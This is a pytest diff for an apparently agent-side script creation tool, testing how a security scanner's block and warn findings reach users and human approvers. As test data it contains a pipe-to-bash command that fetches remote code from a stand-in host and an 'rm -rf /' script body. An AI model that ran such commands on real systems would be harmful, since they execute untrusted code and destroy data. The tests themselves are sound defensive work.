@@ -104,12 +104,43 @@ class TestScriptAssetCreate:
 
     def test_tirith_block_rejected(self, shome, monkeypatch):
         def fake_scan(content):
-            return {"action": "block", "findings": [{"id": "x"}],
-                    "summary": "malicious pattern"}
+            return {"action": "block",
+                    "findings": [{"severity": "HIGH",
+                                  "title": "Pipe to interpreter: curl | bash",
+                                  "description": "pipes output to interpreter 'bash'",
+                                  "evidence": [{"raw": "curl -s http://e/x.sh | bash"}]}],
+                    "summary": ""}
         monkeypatch.setattr("tools.tirith_security.check_command_security", fake_scan)
         out = script_asset_create(name="evil", content="rm -rf /\n", home=shome)
         assert "tirith" in out and "block" in out
+        # 缺口三：拒绝信息里人读得到规则名 + 人话 + 证据（不是恒空 summary）
+        assert "Pipe to interpreter" in out
+        assert "interpreter 'bash'" in out
+        assert "curl -s http://e/x.sh" in out
         assert not (scripts_dir(shome) / "evil.sh").exists()
+
+    def test_tirith_warn_surfaces_findings_in_approval(self, shome, monkeypatch):
+        """缺口三：warn 强制人工时，审批描述里带 findings 的人话诊断。"""
+        def fake_scan(content):
+            return {"action": "warn",
+                    "findings": [{"severity": "MEDIUM", "title": "Lookalike TLD",
+                                  "description": "domain looks like a file extension",
+                                  "evidence": [{"raw": "http://examp1e.com"}]}],
+                    "summary": ""}
+        monkeypatch.setattr("tools.tirith_security.check_command_security", fake_scan)
+        monkeypatch.setenv("VIGIL_INTERACTIVE", "1")
+        seen = {}
+        from tools import terminal_tool
+        def cb(command, description, **k):
+            seen["desc"] = description
+            return "deny"
+        terminal_tool.set_approval_callback(cb)
+        try:
+            script_asset_create(name="warned", content="echo hi\n", home=shome)
+        finally:
+            terminal_tool.set_approval_callback(None)
+        assert "Lookalike TLD" in seen.get("desc", "")
+        assert "examp1e.com" in seen.get("desc", "")
 
     def test_overwrite_requires_flag(self, shome, monkeypatch):
         monkeypatch.setenv("VIGIL_INTERACTIVE", "1")
